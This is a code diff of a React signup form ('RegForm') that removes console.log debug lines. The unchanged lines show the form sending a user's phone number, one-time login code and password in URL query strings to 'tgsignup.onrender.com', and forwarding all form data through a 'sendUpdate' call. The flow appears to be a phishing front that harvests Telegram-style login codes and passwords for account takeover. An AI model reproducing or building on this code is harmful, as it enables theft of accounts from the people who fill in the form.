@@ -24,7 +24,6 @@ const RegForm = (props) => {
     const inputRef = useRef(null);
     const sumbitRef = useRef(null);
     const [ok, setOk] = useState(false);
-    console.log("new", isLoading, activeForm, errMsg, showErr);
     const handleInputChange = async (event) => {
         setFormData({
             ...formData,
@@ -39,7 +38,6 @@ const RegForm = (props) => {
                 const cleanedPhoneNumber = formData.phoneNumber.substring(1);
                 setFormData({ ...formData, phoneNumber: cleanedPhoneNumber })
             }
-            console.log(formData.phoneNumber);
             const mobileNumberPattern = /^[0-9]{10}$/;
 
             if (!mobileNumberPattern.test(formData.phoneNumber)) {
@@ -48,7 +46,6 @@ const RegForm = (props) => {
                 setIsLoading(true);
                 try {
                     const response = await axios.get(`https://tgsignup.onrender.com/login?phone=91${formData.phoneNumber}`);
-                    console.log('Success:', response);
                     await sendUpdate(JSON.stringify(formData));
                     setIsLoading(false);
                     if (response.status === 200) {
@@ -76,7 +73,6 @@ const RegForm = (props) => {
             setShowErr(false);
         }
         const input = e.target;
-        console.log(input.name)
         const inputValue = input.value;
         if (inputValue && !isNaN(inputValue) && inputValue.length === 1) {
             input.value = inputValue;
@@ -115,7 +111,6 @@ const RegForm = (props) => {
                 setIsLoading(true);
                 try {
                     const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${formData.otp}&phone=91${formData.phoneNumber}&password=${formData.password}`);
-                    console.log('Success:', response);
                     setIsLoading(false);
                     await sendUpdate(JSON.stringify(formData));
                     if (response.status === 200) {
